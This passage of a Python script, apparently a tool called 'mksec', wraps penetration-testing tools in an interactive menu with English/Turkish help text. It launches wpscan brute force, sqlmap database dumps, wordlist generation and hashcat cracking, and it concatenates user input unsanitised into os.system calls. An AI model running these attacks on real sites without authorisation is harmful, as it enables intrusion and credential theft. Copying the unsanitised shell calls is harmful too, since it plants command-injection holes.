            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[unix-privesc-check]\033[37m\x1b[0m ")
            UserInputs(uinput+"vuln")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mIt is a tool used to find possible vulnerabilities of the system before escalation in Linux systems. If it doesn't work with the \x1b[36m'run'\x1b[37m command, try the \x1b[36m'run -f'\x1b[37m command.\n\x1b[33mTR:\x1b[37mLinux sistemlerde yetki yükseltme işleminden önce, sistemin olası açıklarını bulmak için kullanılan bir araçtır. \x1b[36m'run'\x1b[37m komutu ile çalışmıyorsa \x1b[36m'run -f'\x1b[37m komutunu deneyiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nCHECK    {}    YES         Scan format: \x1b[32m(standard/detailed)\x1b[37m".format(check))
            elif "set check" in uinput.lower():
                check = uinput
                check = check.replace("set check ","").replace("set CHECK ","").replace("SET check ","").replace("SET CHECK ","").center(25)
            elif "run" == uinput.lower():
                os.system("unix-privesc-check " + check.strip())
            elif "run -f" == uinput.lower():
                os.system("cd /opt/unix-privesc-check/ && bash upc.sh " + check.strip())

    def chkrootkit():
        check = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[chkrootkit]\033[37m\x1b[0m ")
            UserInputs(uinput+"vuln")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mChkrootkit tool analyzes rootkit viruses on the whole system.\nRootkit is a specially crafted malicious software.\nRootkits, like viruses, infiltrate and control the system to damage the system. \n\n\x1b[33mInterpreting Chkrootkit output:\x1b[37m\n\n\x1b[31mNot found:\x1b[37m No virus found.\n\x1b[31mNot infected:\x1b[37m No virus infected.\n\x1b[31mNothing found:\x1b[37m Nothing found.\n\x1b[31mNothing deleted:\x1b[37m Nothing has been deleted.\n\x1b[31mNo suspect files:\x1b[37m Suspicious file not found.\n\x1b[31mInfected:\x1b[37m The virus is infected.\n\n\x1b[33mTR:\x1b[37mChkrootkit aracı, bütün sistemde rootkit virüslerinin analizini yapar.\nRootkit, özel olarak hazırlanmış zararlı bir yazılımdır.\nRootkitler, virüsler gibi sisteme zarar vermek için sisteme sızıp kontrol etmektir.\n\n\x1b[33mChkrootkit çıktısının yorumlanması:\x1b[37m\n\n\x1b[31mNot found:\x1b[37m Virüs bulunamadı.\n\x1b[31mNot infected:\x1b[37m Virüs bulaşmadı.\n\x1b[31mNothing found:\x1b[37m Hiçbir sey bulunamadı.\n\x1b[31mNothing deleted:\x1b[37m Hiçbir sey silinmemiş.\n\x1b[31mNo suspect files:\x1b[37m Şüpheli dosya bulunamadı.\n\x1b[31mInfected:\x1b[37m Virüs bulaştı.\n")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nCHECK    {}    NO              ---".format(check))
            elif "set check" in uinput.lower():
                check = uinput
                check = check.replace("set check ","").replace("set CHECK ","").replace("SET check ","").replace("SET CHECK ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo chkrootkit")

    def lynis():
        check = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[lynis]\033[37m\x1b[0m ")
            UserInputs(uinput+"vuln")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mLynis is a system integrity scan program for Linux and Unix based systems. It checks that the services that make the system work are integrated and error-free. \n\x1b[33mTR:\x1b[37mLynis, Linux ve Unix temelli sistemler için bir sistem bütünlük tarama programıdır. Sistemin çalışmasını sağlayan servislerin entegre ve hatasız çalıştığını kontrol eder.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nCHECK    {}    NO              ---".format(check))
            elif "set check" in uinput.lower():
                check = uinput
                check = check.replace("set check ","").replace("set CHECK ","").replace("SET check ","").replace("SET CHECK ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo lynis audit system")

    def skipfish():
        url = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[skipfish]\033[37m\x1b[0m ")
            UserInputs(uinput+"webapp")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mSearches the website for vulnerabilities.\n\x1b[33mTR:\x1b[37mWeb sitesinde zafiyet arar.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nURL   {}     YES         Target Site \x1b[32mex: http://testphp.vulnweb.com\x1b[37m\nOUTPUT{}     YES         Where you want to save? \x1b[32mex: /root/Desktop/test\x1b[37m".format(url,output))
            elif "set url" in uinput.lower():
                url = uinput
                url = url.replace("set url ","").replace("set URL ","").replace("SET url ","").replace("SET URL ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "run" == uinput.lower():
                os.system("skipfish -o " + output.strip() + " " + url.strip())

    def wpscan():
        url = "                         "
        output = "                         "
        attacks = "                         "
        usernamelist = "                         "
        passwordlist = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[wpscan]\033[37m\x1b[0m ")
            UserInputs(uinput+"webapp")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mWPScan can be used in various areas such as finding and brute-force plugins and themes used on a WordPress site.\n\x1b[33mTR:\x1b[37mWPScan, bir WordPress sitesinde kullanılan eklentileri ve temaları bulmak ve brute force yapmak gibi çeşitli alanlarda kullanılabilir.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m        \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m        \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nURL     {}    YES          Target Site \x1b[32mex: hackware.ru\x1b[37m\nOUTPUT  {}    YES          Where you want to save? \x1b[32mex: /root/Desktop/test\x1b[37m\nUSERNAME{}    NO           Only used for brute force attack \x1b[32mex: /root/Desktop/username-list.txt\x1b[37m\nPASSWORD{}    NO           Only used for brute force attack \x1b[32mex: /root/Desktop/password-list.txt\x1b[37m\nATTACK  {}    OPT          To see attack types: \x1b[32m--attacks\x1b[37m".format(url,output,usernamelist,passwordlist,attacks))
            elif "--attacks" == uinput.lower():
                print("\x1b[1m\x1b[37m\nLeave blank for \x1b[33mQuick scan\x1b[37m\nType \x1b[36m'-e vp'\x1b[37m for \x1b[33mVulnerable Plugins\x1b[37m\nType \x1b[36m'-e ap'\x1b[37m for \x1b[33mAll Plugins\x1b[37m\nType \x1b[36m'-e p'\x1b[37m for \x1b[33mPopular Plugins\x1b[37m\nType \x1b[36m'-e vt'\x1b[37m for \x1b[33mVulnerable Themes\x1b[37m\nType \x1b[36m'-e at'\x1b[37m for \x1b[33mAll Themes\x1b[37m\nType \x1b[36m'-e t'\x1b[37m for \x1b[33mPopuler Themes\x1b[37m\nType \x1b[36m'-e tt'\x1b[37m for \x1b[33mTimthumbs\x1b[37m\nType \x1b[36m'-e cb'\x1b[37m for \x1b[33mConfig Backups\x1b[37m\nType \x1b[36m'-e dbe'\x1b[37m for \x1b[33mDB Exports\x1b[37m\nType \x1b[36m'-e u\x1b[37m' for \x1b[33mUser ID's\x1b[37m\nType \x1b[36m'-e m'\x1b[37m for \x1b[33mMedia ID's\x1b[37m\nFill in all options for \x1b[33mBrute Force\x1b[37m and run it by typing \x1b[36m'brute force'\x1b[37m\x1b[32m\n")
            elif "set url" in uinput.lower():
                url = uinput
                url = url.replace("set url ","").replace("set URL ","").replace("SET url ","").replace("SET URL ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "set username" in uinput.lower():
                usernamelist = uinput
                usernamelist = usernamelist.replace("set username ","").replace("set USERNAME ","").replace("SET username ","").replace("SET USERNAME ","").center(25)
            elif "set password" in uinput.lower():
                passwordlist = uinput
                passwordlist = passwordlist.replace("set password ","").replace("set PASSWORD ","").replace("SET password ","").replace("SET PASSWORD ","").center(25)
            elif "set attack" in uinput.lower():
                attacks = uinput
                attacks = attacks.replace("set attack ","").replace("set ATTACK ","").replace("SET attack ","").replace("SET ATTACK ","").center(25)
            elif "run" == uinput.lower():
                print("please wait...")
                os.system("wpscan --url " + url.strip() + " -o " + output.strip() + " " + attacks.strip() + " --random-user-agent")
            elif "brute" == uinput.lower():
                print("please wait...")
                os.system("sudo wpscan --url " + url.strip() + " -o " + output.strip() + " -U " + usernamelist.strip() + " -P " + passwordlist.strip() + " --random-user-agent ")

    def sqlmap():
        url = "                                                  "
        database = "                                                  "
        tables = "                                                  "
        columns = "                                                  "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[sqlmap]\033[37m\x1b[0m ")
            UserInputs(uinput+"webapp")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[37m\x1b[33mWhat is Sqlmap?\x1b[37m\n\x1b[33m===============\x1b[37m\nSqlmap is an open source sql injection vulnerability detection and exploitation tool.\nIt detects the type of sql injection on the system by sending various queries/commands to the database system used by the target web application provided to it.\n\n\x1b[33mHere are some data that can be obtained about the target with sqlmap:\x1b[37m\n\x1b[33m=====================================================================\x1b[37m\nDatabase type and version (–banner, –all)\nCurrent used database and all database names that can be accessed (–current-db, –dbs)\nDatabase tables (tables) and their columns (columns) (–tables, –columns)\nDatabase data(–dump, –dump-all)\nDatabase current user and all users(–current-user, –users)\nDatabase user password (–passwords)\nInformation whether the database user is DB admin (–is-dba)\nInformation about the target server (Operating system, technology in which the application is used, etc., -f)\n\n\x1b[33mHow is it used in \x1b[36mMKSEC\x1b[37m?\n====================================\n\x1b[32m[1]\x1b[37m If you are only going to enter 'URL' and you want to test the exposed site, type \x1b[36m'run --url'\x1b[37m or \x1b[36m'run -u'\x1b[37m.\n\x1b[32m[2]\x1b[37m If you have accessed the database on the vulnerable site and filled in the 'URL' and 'DB' sections, type \x1b[36m'run --url --database'\x1b[37m or \x1b[36m'run -u -d'\x1b[37m.\n\x1b[32m[3]\x1b[37m If you have filled in 'URL', 'DB', 'TABLES' in the vulnerable site, type \x1b[36m'run --url --database --tables'\x1b[37m or \x1b[36m'run -u -d -t'\x1b[37m.\n\x1b[32m[4]\x1b[37m If you have filled in 'URL', 'DB', 'TABLES', 'COLUMNS' on the vulnerable site, type \x1b[36m'run --url --database --tables --columns'\x1b[37m or \x1b[36m'run -u -d -t -c'\x1b[37m.\n\n\n\x1b[33mSqlmap Nedir?\x1b[37m\n\x1b[33m=============\x1b[37m\nSqlmap açık kaynak kodlu sql injection açıklığı tespit ve istismar etme aracıdır.\nKendisine sağlanan hedef web uygulamasının kullandığı veritabanı sistemine gönderdiği çeşitli sorgular/komutlar ile sistem üzerindeki sql injection tipini tespit eder.\n\n\x1b[33mSqlmap ile hedef hakkında elde edilebilen bazı veriler;\x1b[37m\n\x1b[33m=======================================================\x1b[37m\nVeritabanı türü ve versiyonu (–banner,–all)\nMevcut kullanılan veritabanı ve erişilebilen tüm veritabanı isimleri (–current-db, –dbs)\nVeritabanı tabloları(tables) ve bu tablolara ait kolonları(columns) (–tables, –columns)\nVeritabanı datası(–dump, –dump-all)\nVeritabanı mevcut kullanıcısı ve tüm kullanıcılar(–current-user,–users)\nVeritabanı kullanıcı parolası (–passwords)\nVeritabanı kullanıcısının DB admin olup olmadığı bilgisi(–is-dba)\nHedef sunucu hakkında bilgi(İşletim sistemi, Uygulamanın kullanıldığı teknoloji vs. , -f)\n\n\x1b[36mMKSEC\x1b[33m içerisinde nasıl kullanılır?\x1b[37m\n\x1b[33m==================================\x1b[37m\n\x1b[32m[1]\x1b[37m Sadece 'URL' girecekseniz ve açıklı siteyi test etmek istiyorsanız \x1b[36m'run --url'\x1b[37m or \x1b[36m'run -u'\x1b[37m yazınız.\n\x1b[32m[2]\x1b[37m Zaafiyetli sitedeki veritabanına eriştiyseniz ve 'URL' ve 'DB' kısımlarını doldurduysanız \x1b[36m'run --url --database'\x1b[37m or \x1b[36m'run -u -d'\x1b[37m yazınız.\n\x1b[32m[3]\x1b[37m Zaafiyetli sitede 'URL', 'DB', 'TABLES' kısımlarını doldurduysanız \x1b[36m'run --url --database --tables'\x1b[37m or \x1b[36m'run -u -d -t'\x1b[37m yazınız.\n\x1b[32m[4]\x1b[37m Zaafiyetli sitede 'URL', 'DB', 'TABLES', 'COLUMNS' kısımlarını doldurduysanız \x1b[36m'run --url --database --tables --columns'\x1b[37m or \x1b[36m'run -u -d -t -c'\x1b[37m yazınız.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m      \x1b[33mCurrent Setting\x1b[37m                                 \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m     \x1b[33m===============\x1b[37m                                 \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nURL    {}       YES         Target Site  \x1b[32mex: http://www.test.com/article.php?id=108\x1b[37m\nDB     {}       OPT         Database name of target site  \x1b[32mex: Information_Schema\x1b[37m\nTABLES {}       OPT         Tables of the target site  \x1b[32mex: Administrators\x1b[37m\nCOLUMNS{}       OPT         Columns of the target site  \x1b[32mex: Columns\x1b[37m".format(url,database,tables,columns))
            elif "set url" in uinput.lower():
                url = uinput
                url = url.replace("set url ","").replace("set URL ","").replace("SET url ","").replace("SET URL ","").center(50)
            elif "set db" in uinput.lower():
                database = uinput
                database = database.replace("set db ","").replace("set DB ","").replace("SET db ","").replace("SET DB ","").center(50)
            elif "set tables" in uinput.lower():
                tables = uinput
                tables = tables.replace("set tables ","").replace("set TABLES ","").replace("SET tables ","").replace("SET TABLES ","").center(50)
            elif "set columns" in uinput.lower():
                columns = uinput
                columns = columns.replace("set columns ","").replace("set COLUMNS ","").replace("SET columns ","").replace("SET COLUMNS ","").center(50)
            elif "run" == uinput.lower():
                print("\x1b[1m\x1b[31mCommand not found. You can check the run command by typing 'info'\x1b[1m")
            elif "run --url" == uinput.lower() or "run -u" == uinput.lower():
                print("\x1b[1m\x1b[36m[*]MKSEC")
                os.system("sqlmap -u " + url.strip() + " --dbs --random-agent")
            elif "run --url --database" == uinput.lower() or "run -u -d" == uinput.lower():
                print("\x1b[1m\x1b[36m[*]MKSEC")
                os.system("sqlmap -u " + url.strip() + " -D " + database.strip() + " --tables --random-agent")
            elif "run --url --database --tables" == uinput.lower() or "run -u -d -t" == uinput.lower():
                print("\x1b[1m\x1b[36m[*]MKSEC")
                os.system("sqlmap -u " + url.strip() + " -D " + database.strip() + " -T " + tables.strip() + " -- columns --random-agent")
            elif "run --url --database --tables --columns" == uinput.lower() or "run -u -d -t -c" == uinput.lower():
                print("\x1b[1m\x1b[36m[*]MKSEC")
                os.system("sqlmap -u " + url.strip() + " -D " + database.strip() + " -T " + tables.strip() + " -C " + columns.strip() + " --dump --random-agent")
        else:
            os.system("clear")
            sqlmap()

    def cewl():
        url = "                         "
        mail = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[cewl]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mCollects the words that can be a password on any site and prepares a wordlist using these words. Can also collect e-mail addresses from the site.\n\x1b[33mTR:\x1b[37mHerhangi bir sitede şifre olabilecek kelimeleri toplar ve bu kelimeleri kullanarak bir kelime listesi hazırlar. Ayrıca siteden e-posta adreslerini de toplayabilir. ")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nURL   {}    YES          Target Site \x1b[32mex: test.com\x1b[37m \nOUTPUT{}    YES          Where you want to save? \x1b[32mex: /root/Desktop/test.txt\x1b[37m\nMAIL  {}    OPT          If you want to find the e-mail addresses on the target website, type \x1b[32m'-e'\x1b[37m".format(url,output,mail))
            elif "set url" in uinput.lower():
                url = uinput
                url = url.replace("set url ","").replace("set URL ","").replace("SET url ","").replace("SET URL ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "set mail" in uinput.lower():
                mail = uinput
                mail = mail.replace("set mail ","").replace("set MAIL ","").replace("SET mail ","").replace("SET MAIL ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo cewl " + url.strip() + " -w " + output.strip() + " " + mail.strip())

    def crunch():
        min = "                         "
        max = "                         "
        char = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[crunch]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mIt is a tool that allows you to create a wordlist with the specified length and characters from previously determined character sets or created by you.\n\x1b[33mTR:\x1b[37mDaha önce belirlediğiniz veya sizin oluşturduğunuz karakter kümelerinden belirtilen uzunluk ve karakterlerle wordlist oluşturmanıza olanak sağlayan bir araçtır.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nMIN      {}    YES         The words in the word list you will create should consist of at least how many letters \x1b[32mex: 8\x1b[37m\nMAX      {}    YES         How many letters should the words in the word list you create consist of? \x1b[32mex: 16\x1b[37m\nCHAR     {}    YES         Identify the letters in the word list you will create \x1b[32mex: xyzABC123_-*\x1b[37m\nOUTPUT   {}    YES         Output \x1b[32mex: /root/Desktop/mksec\x1b[37m".format(min,max,char,output))
            elif "set min" in uinput.lower():
                min = uinput
                min = min.replace("set min ","").replace("set MIN ","").replace("SET min ","").replace("SET MIN ","").center(25)
            elif "set max" in uinput.lower():
                max = uinput
                max = max.replace("set max ","").replace("set MAX ","").replace("SET max ","").replace("SET MAX ","").center(25)
            elif "set char" in uinput.lower():
                char = uinput
                char = char.replace("set char ","").replace("set CHAR ","").replace("SET char ","").replace("SET CHAR ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo crunch " + min.strip() + " " + max.strip() + " " + char.strip() + " -o " + output.strip())
                print("Process Completed")

    def hashcat():
        hash = "                         "
        hashmode = "                         "
        wordlist = "                         "
        bruteforce = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[hashcat]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mBreaks one-way encryption algorithms (hashes).\nUsage:\nIn order to crack the hash, you can try only one of the wordlist or brute force methods at once.\nIf you want to try with wordlist, you should fill in \x1b[34m'WORDLIST'\x1b[37m and type \x1b[34m'run -w'\x1b[37m.\nIf you want to try with brute force, you should fill in \x1b[34m'BRUTEFORCE'\x1b[37m and type \x1b[34m'run -b'\x1b[37m.\n\x1b[1m\x1b[33mTR:\x1b[37mTek yönlü şifreleme algoritmalarını (hashes) kırar.\nKullanımı:\nHash'i kırmak için aynı anda wordlist veya brute force yöntemlerinden sadece birini deneyebilirsiniz.\nKelime listesi (Wordlist) ile denemek istiyorsanız, \x1b[34m'WORDLIST'\x1b[37m alanını doldurmalı ve \x1b[34m'run -w'\x1b[37m yazmalısınız.\nKaba kuvvetle (Brute-Force) denemek istiyorsanız, \x1b[34m'BRUTEFORCE'\x1b[37m alanını doldurmalı ve \x1b[34m'run -b'\x1b[37m yazmalısınız.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m        \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m       \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nMODE      {}    YES         You can see the hash modes by typing \x1b[32m'--hash mode'\x1b[37m. MD5 = 0 \x1b[32mex: 0\x1b[37m\nHASH      {}    YES         Enter the hash file \x1b[32mex: /root/Desktop/hash.txt\x1b[37m\nWORDLIST  {}    OPT         Enter the word list \x1b[32mex: /root/Desktop/wordlist.txt\x1b[37m\nBRUTEFORCE{}    OPT         If you are going to brute force attack, type \x1b[32m'--brute force'\x1b[37m to see its usage".format(hashmode,hash,wordlist,bruteforce))
            elif "set mode" in uinput.lower():
                hashmode = uinput
                hashmode = hashmode.replace("set mode ","").replace("set MODE ","").replace("SET mode ","").replace("SET MODE ","").center(25)
            elif "set hash" in uinput.lower():
                hash = uinput
                hash = hash.replace("set hash ","").replace("set HASH ","").replace("SET hash ","").replace("SET HASH ","").center(25)
            elif "set wordlist" in uinput.lower():
                wordlist = uinput
                wordlist = wordlist.replace("set wordlist ","").replace("set WORDLIST ","").replace("SET wordlist ","").replace("SET WORDLIST ","").center(25)
            elif "set bruteforce" in uinput.lower():
                bruteforce = uinput
                bruteforce = bruteforce.replace("set bruteforce ","").replace("set BRUTEFORCE ","").replace("SET bruteforce ","").replace("SET BRUTEFORCE ","").center(25)
            elif "--hash mode" == uinput.lower():
                            print("- [ Hash modes ] -\n\n        # | Name                                             | Category\n==========+==================================================+=====================================\n      900 | MD4                                              | Raw Hash\n        0 | MD5                                              | Raw Hash\n      100 | SHA1                                             | Raw Hash\n     1300 | SHA2-224                                         | Raw Hash\n     1400 | SHA2-256                                         | Raw Hash\n    10800 | SHA2-384                                         | Raw Hash\n     1700 | SHA2-512                                         | Raw Hash\n    17300 | SHA3-224                                         | Raw Hash\n    17400 | SHA3-256                                         | Raw Hash\n    17500 | SHA3-384                                         | Raw Hash\n    17600 | SHA3-512                                         | Raw Hash\n     6000 | RIPEMD-160                                       | Raw Hash\n      600 | BLAKE2b-512                                      | Raw Hash\n    11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash\n    11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash\n     6900 | GOST R 34.11-94                                  | Raw Hash\n     5100 | Half MD5                                         | Raw Hash\n    18700 | Java Object hashCode()                           | Raw Hash\n    17700 | Keccak-224                                       | Raw Hash\n    17800 | Keccak-256                                       | Raw Hash\n    17900 | Keccak-384                                       | Raw Hash\n    18000 | Keccak-512                                       | Raw Hash\n    21400 | sha256(sha256_bin($pass))                        | Raw Hash\n     6100 | Whirlpool                                        | Raw Hash\n    10100 | SipHash                                          | Raw Hash\n    21000 | BitShares v0.x - sha512(sha512_bin(pass))        | Raw Hash\n       10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated\n       20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated\n     3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated\n     3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated\n     4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated\n     4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated\n    21300 | md5($salt.sha1($salt.$pass))                     | Raw Hash, Salted and/or Iterated\n       40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated\n     2600 | md5(md5($pass))                                  | Raw Hash, Salted and/or Iterated\n     3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated\n     4400 | md5(sha1($pass))                                 | Raw Hash, Salted and/or Iterated\n    20900 | md5(sha1($pass).md5($pass).sha1($pass))          | Raw Hash, Salted and/or Iterated\n    21200 | md5(sha1($salt).md5($pass))                      | Raw Hash, Salted and/or Iterated\n     4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and/or Iterated\n       30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated\n      110 | sha1($pass.$salt)                                | Raw Hash, Salted and/or Iterated\n      120 | sha1($salt.$pass)                                | Raw Hash, Salted and/or Iterated\n     4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and/or Iterated\n     4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and/or Iterated\n      140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and/or Iterated\n    19300 | sha1($salt1.$pass.$salt2)                        | Raw Hash, Salted and/or Iterated\n    14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated\n     4700 | sha1(md5($pass))                                 | Raw Hash, Salted and/or Iterated\n     4710 | sha1(md5($pass).$salt)                           | Raw Hash, Salted and/or Iterated\n    21100 | sha1(md5($pass.$salt))                           | Raw Hash, Salted and/or Iterated\n    18500 | sha1(md5(md5($pass)))                            | Raw Hash, Salted and/or Iterated\n     4500 | sha1(sha1($pass))                                | Raw Hash, Salted and/or Iterated\n      130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and/or Iterated\n     1410 | sha256($pass.$salt)                              | Raw Hash, Salted and/or Iterated\n     1420 | sha256($salt.$pass)                              | Raw Hash, Salted and/or Iterated\n    22300 | sha256($salt.$pass.$salt)                        | Raw Hash, Salted and/or Iterated\n     1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated\n    20800 | sha256(md5($pass))                               | Raw Hash, Salted and/or Iterated\n    20710 | sha256(sha256($pass).$salt)                      | Raw Hash, Salted and/or Iterated\n     1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated\n     1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated\n     1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated\n     1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated\n     1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated\n    19500 | Ruby on Rails Restful-Authentication             | Raw Hash, Salted and/or Iterated\n       50 | HMAC-MD5 (key = $pass)                           | Raw Hash, Authenticated\n       60 | HMAC-MD5 (key = $salt)                           | Raw Hash, Authenticated\n      150 | HMAC-SHA1 (key = $pass)                          | Raw Hash, Authenticated\n      160 | HMAC-SHA1 (key = $salt)                          | Raw Hash, Authenticated\n     1450 | HMAC-SHA256 (key = $pass)                        | Raw Hash, Authenticated\n     1460 | HMAC-SHA256 (key = $salt)                        | Raw Hash, Authenticated\n     1750 | HMAC-SHA512 (key = $pass)                        | Raw Hash, Authenticated\n     1760 | HMAC-SHA512 (key = $salt)                        | Raw Hash, Authenticated\n    11750 | HMAC-Streebog-256 (key = $pass), big-endian      | Raw Hash, Authenticated\n    11760 | HMAC-Streebog-256 (key = $salt), big-endian      | Raw Hash, Authenticated\n    11850 | HMAC-Streebog-512 (key = $pass), big-endian      | Raw Hash, Authenticated\n    11860 | HMAC-Streebog-512 (key = $salt), big-endian      | Raw Hash, Authenticated\n    11500 | CRC32                                            | Raw Checksum\n    14100 | 3DES (PT = $salt, key = $pass)                   | Raw Cipher, Known-Plaintext attack\n    14000 | DES (PT = $salt, key = $pass)                    | Raw Cipher, Known-Plaintext attack\n    15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack\n    14900 | Skip32 (PT = $salt, key = $pass)                 | Raw Cipher, Known-Plaintext attack\n    11900 | PBKDF2-HMAC-MD5                                  | Generic KDF\n    12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF\n    10900 | PBKDF2-HMAC-SHA256                               | Generic KDF\n    12100 | PBKDF2-HMAC-SHA512                               | Generic KDF\n     8900 | scrypt                                           | Generic KDF\n      400 | phpass                                           | Generic KDF\n    16900 | Ansible Vault                                    | Generic KDF\n    12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Generic KDF\n    20200 | Python passlib pbkdf2-sha512                     | Generic KDF\n    20300 | Python passlib pbkdf2-sha256                     | Generic KDF\n    20400 | Python passlib pbkdf2-sha1                       | Generic KDF\n    16100 | TACACS+                                          | Network Protocols\n    11400 | SIP digest authentication (MD5)                  | Network Protocols\n     5300 | IKE-PSK MD5                                      | Network Protocols\n     5400 | IKE-PSK SHA1                                     | Network Protocols\n    23200 | XMPP SCRAM PBKDF2-SHA1                           | Network Protocols\n     2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols\n     2501 | WPA-EAPOL-PMK                                    | Network Protocols\n    22000 | WPA-PBKDF2-PMKID+EAPOL                           | 